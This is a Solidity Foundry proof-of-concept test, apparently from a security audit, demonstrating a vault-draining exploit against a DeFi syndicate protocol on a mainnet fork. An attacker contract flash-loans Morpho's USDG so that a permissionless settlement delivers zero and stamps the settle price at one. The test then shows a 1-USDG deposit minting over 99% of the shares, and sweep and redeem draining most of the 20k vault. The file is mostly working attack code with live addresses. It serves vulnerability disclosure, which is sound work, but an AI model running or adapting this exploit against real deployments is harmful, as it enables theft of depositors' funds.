// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {RobinhoodMainnetIntegrationTest} from "../integration/RobinhoodMainnetIntegrationTest.sol";
import {ISyndicateGovernor} from "../../src/interfaces/ISyndicateGovernor.sol";
import {IVaultWithdrawalQueue} from "../../src/interfaces/IVaultWithdrawalQueue.sol";
import {MorphoSupplyStrategy} from "../../src/strategies/MorphoSupplyStrategy.sol";
import {IMorpho, Id, MarketParams} from "../../src/vendor/morpho/IMorpho.sol";
import {TierRegistry} from "../../src/TierRegistry.sol";
import {BatchExecutorLib} from "../../src/BatchExecutorLib.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {GovEnvelope} from "../helpers/GovEnvelope.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMorphoFlash {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

/**
 * @notice Attacker contract: flash-loans Morpho's entire USDG balance so that,
 *         inside the callback, `MorphoSupplyStrategy._deliverableNow` reads
 *         `IERC20(asset).balanceOf(morpho) == 0` and settlement delivers ZERO —
 *         then calls the permissionless `settleProposal` from that frame.
 */
contract MorphoFlashSettler {
    IMorphoFlash immutable morpho;
    IERC20 immutable usdg;
    ISyndicateGovernor immutable governor;

    constructor(address morpho_, address usdg_, address governor_) {
        morpho = IMorphoFlash(morpho_);
        usdg = IERC20(usdg_);
        governor = ISyndicateGovernor(governor_);
    }

    function attack(uint256 pid, uint256 idleToDrain) external {
        morpho.flashLoan(address(usdg), idleToDrain, abi.encode(pid));
    }

    // Morpho Blue flash-loan callback (0 fee).
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(morpho), "only morpho");
        uint256 pid = abi.decode(data, (uint256));
        // Morpho's USDG balance is now 0 → strategy.settle() delivers nothing,
        // yet the drawdown gate is vacuous at maxDrawdownBps == 10_000.
        governor.settleProposal(pid);
        usdg.approve(address(morpho), assets); // repay (fee-free)
    }
}

/**
 * @title Finding #2 PoC — vacuous drawdown floor lets settle stamp num == 1
 * @notice At `maxDrawdownBps == 10_000` the settle-time drawdown floor reduces
 *         to `basis > maxCapital` (== basis), which is false, so the gate is
 *         SKIPPED. A permissionless `settleProposal` fired from inside a Morpho
 *         `flashLoan` (which empties Morpho's idle USDG, capping the strategy's
 *         deliverable at 0) therefore stamps the queue settle price at
 *         `num = totalAssets() + 1 = 1`. A 1-USDG queued deposit then mints
 *         effectively the entire share supply; `sweep()` + `redeem()` drains
 *         the vault to the attacker.
 *
 * @dev Forks Robinhood mainnet at `latest` (public RPC is not archival). Uses
 *      the live canonical Morpho Blue singleton and its deepest USDG market.
 *      Run:
 *        ROBINHOOD_RPC_URL=https://rpc.mainnet.chain.robinhood.com \
 *        forge test --match-path "test/pocs/Finding2_VacuousDrawdownStampAtOne.t.sol" -vv
 */
contract Finding2VacuousDrawdownStampAtOne is RobinhoodMainnetIntegrationTest {
    address constant MORPHO = 0x9D53d5E3bd5E8d4Cbfa6DB1ca238AEA02E651010;
    bytes32 constant MARKET_ID = 0x0309c02dabf0be02682af1a2bde9a457f4df0f0b6bc889cde3f948e5315e4114;

    uint256 constant LP_EACH = 10_000e6; // two LPs, 20k USDG total
    uint256 constant DEPLOY_ALL = 20_000e6; // deploy 100% so idle → 0 at settle
    uint256 constant STRATEGY_DURATION = 1 hours;

    address template;
    address attacker = makeAddr("attacker");
    MarketParams mp;

    function setUp() public override {
        string memory rpc = vm.envOr("ROBINHOOD_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            vm.skip(true);
            return;
        }
        vm.createSelectFork(rpc); // latest
        require(block.chainid == 4663, "not on Robinhood mainnet fork");

        wood = new ERC20Mock("Wood", "WOOD", 18);
        _deployProtocol();
        _bondOwnerStake();
        _createSyndicate();
        _fundAndDeposit(LP_EACH, LP_EACH); // 20k USDG total supply
        vm.warp(vm.getBlockTimestamp() + 1);

        mp = IMorpho(MORPHO).idToMarketParams(Id.wrap(MARKET_ID));
        require(mp.loanToken == USDG, "market loan token != USDG");

        template = address(new MorphoSupplyStrategy());

        // MorphoSupplyStrategy._initialize requires MORPHO allowlisted as an
        // adapter (it is the vault-fund spender).
        vm.prank(deployer);
        TierRegistry(tierRegistry).setAdapterAllowed(MORPHO, true);
    }

    function _execCalls(address strategy) internal view returns (BatchExecutorLib.Call[] memory calls) {
        calls = new BatchExecutorLib.Call[](2);
        calls[0] =
            BatchExecutorLib.Call({target: USDG, data: abi.encodeCall(IERC20.approve, (strategy, DEPLOY_ALL)), value: 0});
        calls[1] = BatchExecutorLib.Call({target: strategy, data: abi.encodeWithSignature("execute()"), value: 0});
    }

    function _settleCalls(address strategy) internal pure returns (BatchExecutorLib.Call[] memory calls) {
        calls = new BatchExecutorLib.Call[](1);
        calls[0] = BatchExecutorLib.Call({target: strategy, data: abi.encodeWithSignature("settle()"), value: 0});
    }

    function _proposeVoteExecute(address strategy) internal returns (uint256 proposalId) {
        BatchExecutorLib.Call[] memory execCalls = _execCalls(strategy);
        BatchExecutorLib.Call[] memory settleCalls = _settleCalls(strategy);

        // permissive() => maxCapital = totalAssets() (== basis at execute) AND
        // maxDrawdownBps = 10_000 — exactly the envelope that makes the settle
        // floor vacuous.
        uint256 maxCapital = GovEnvelope.permissive(address(vault)).maxCapital;
        uint256[] memory execCaps = new uint256[](execCalls.length);
        execCaps[execCalls.length - 1] = maxCapital; // mover is the LAST call

        vm.prank(agent);
        proposalId = governor.propose(
            address(vault),
            strategy,
            "ipfs://finding2-poc",
            STRATEGY_DURATION,
            GovEnvelope.permissive(address(vault)),
            execCalls,
            execCaps,
            settleCalls,
            GovEnvelope.defaultCaps(maxCapital, settleCalls.length),
            _emptyCoProposers()
        );

        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(lp1);
        governor.vote(proposalId, ISyndicateGovernor.VoteType.For);
        vm.prank(lp2);
        governor.vote(proposalId, ISyndicateGovernor.VoteType.For);

        ISyndicateGovernor.GovernorParams memory params = governor.getGovernorParams();
        vm.warp(vm.getBlockTimestamp() + params.votingPeriod + 1);
        registry.openReview(address(governor), proposalId);
        uint256 reviewPeriod = registry.reviewPeriod();
        vm.warp(vm.getBlockTimestamp() + reviewPeriod + 1);
        registry.resolveReview(address(governor), proposalId);

        governor.executeProposal(proposalId);
    }

    function test_finding2_vacuousDrawdownStampAtOne() public {
        // Clone + init MorphoSupplyStrategy for the deepest live USDG market.
        address strategy = _cloneAndInit(template, abi.encode(MORPHO, mp, DEPLOY_ALL));

        uint256 supplyBefore = vault.totalSupply();
        console2.log("LP total supply (shares):              ", supplyBefore);

        uint256 pid = _proposeVoteExecute(strategy);
        // 100% deployed: vault idle USDG is ~0.
        console2.log("Vault idle USDG after execute:         ", IERC20(USDG).balanceOf(address(vault)));

        // ── Attacker queues a 1-USDG deposit against the open proposal ──
        deal(USDG, attacker, 1e6);
        vm.startPrank(attacker);
        IERC20(USDG).approve(address(vault), 1e6);
        uint256 reqId = vault.requestDeposit(1e6, attacker);
        vm.stopPrank();

        // Strategy duration elapses.
        vm.warp(vm.getBlockTimestamp() + STRATEGY_DURATION + 1);

        // ── Flash-loan-timed settle: empty Morpho's idle USDG so the strategy
        //    delivers 0, and the drawdown gate (vacuous at 10_000 bps) waves it
        //    through. ──
        MorphoFlashSettler settler = new MorphoFlashSettler(MORPHO, USDG, address(governor));
        uint256 morphoIdle = IERC20(USDG).balanceOf(MORPHO);
        console2.log("Morpho idle USDG to flash-drain:       ", morphoIdle);
        vm.prank(attacker);
        settler.attack(pid, morphoIdle);

        // ── The stamp is num == 1 ──
        address queue = vault.withdrawalQueue();
        IVaultWithdrawalQueue.SettlePrice memory sp = IVaultWithdrawalQueue(queue).getSettlePrice(pid);
        console2.log("Settle stamp num:                      ", sp.num);
        console2.log("Settle stamp den:                      ", sp.den);
        assertEq(sp.num, 1, "settle price stamped at num == 1 (under-delivered unwind)");

        // ── Attacker claims the 1-USDG deposit → mints ~entire supply ──
        vm.prank(attacker);
        uint256 minted = IVaultWithdrawalQueue(queue).claim(reqId);
        console2.log("Shares minted for 1 USDG:              ", minted);

        uint256 attackerShares = vault.balanceOf(attacker);
        uint256 supplyAfter = vault.totalSupply();
        console2.log("Attacker shares:                       ", attackerShares);
        console2.log("Total supply after:                    ", supplyAfter);
        // Ownership fraction in basis points.
        uint256 ownBps = (attackerShares * 10_000) / supplyAfter;
        console2.log("Attacker ownership (bps of supply):    ", ownBps);
        assertGt(ownBps, 9_900, "attacker owns >99% of the vault for 1 USDG");

        // ── Complete the drain: recover the stuck 20k from Morpho, redeem ──
        MorphoSupplyStrategy(strategy).sweep(); // permissionless; Morpho refilled post-flashloan
        console2.log("Vault USDG after sweep:                ", IERC20(USDG).balanceOf(address(vault)));

        uint256 maxR = vault.maxRedeem(attacker);
        vm.prank(attacker);
        uint256 assetsOut = vault.redeem(maxR, attacker, attacker);
        console2.log("Attacker USDG drained (for 1 USDG in):  ", assetsOut);
        assertGt(assetsOut, 15_000e6, "attacker drained the bulk of the 20k vault for 1 USDG");
    }
}
